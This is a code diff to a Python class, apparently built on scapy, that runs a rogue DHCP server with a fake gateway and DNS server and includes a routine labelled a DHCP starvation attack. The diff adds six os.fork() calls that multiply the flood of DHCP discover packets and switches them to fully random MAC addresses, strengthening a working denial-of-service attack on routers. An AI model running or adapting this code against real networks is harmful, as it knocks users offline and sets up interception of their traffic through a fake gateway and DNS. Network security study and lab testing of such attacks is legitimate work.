@@ -14,7 +14,7 @@ class DHCPListener:
     __DHCPServerIp: str
     __DHCPMac: str
     __dictIPS: dict
-    __IPPol: list
+    __IPPool: list
 
     # DHCP configuration
     __fakeDNSServer: str
@@ -30,7 +30,6 @@ class DHCPListener:
         self.__DHCPMac = Ether().src
         self.__dictIPS = {}
         self.__IPPool = self.getIPPool("192.168.0.101-200")
-        print(self.__IPPol)
 
         self.__fakeDNSServer = "8.8.8.8"
         self.__fakeSubnetMask = ""
@@ -45,6 +44,9 @@ class DHCPListener:
 
     def setGatewayIP(self, gateway):
         self.__fakeGatewayIP = gateway
+
+    def setIPPool(self, IPPool):
+        self.__IPPool = IPPool
 
     def getIPPool(self, iprange):
         return self.returnRange(iprange)
@@ -87,8 +89,14 @@ class DHCPListener:
 
     # DoS to router -- DHCP starvation attack
     def starvation(self, delay, iteration):
+        os.fork()
+        os.fork()
+        os.fork()
+        os.fork()
+        os.fork()
+        os.fork()
         for i in range(iteration):
-            request = self.generatePacketClient("discover", RandMAC("00-00-00-00-00-00"))
+            request = self.generatePacketClient("discover", RandMAC())
             sendp(request)
             time.sleep(int(delay))
 
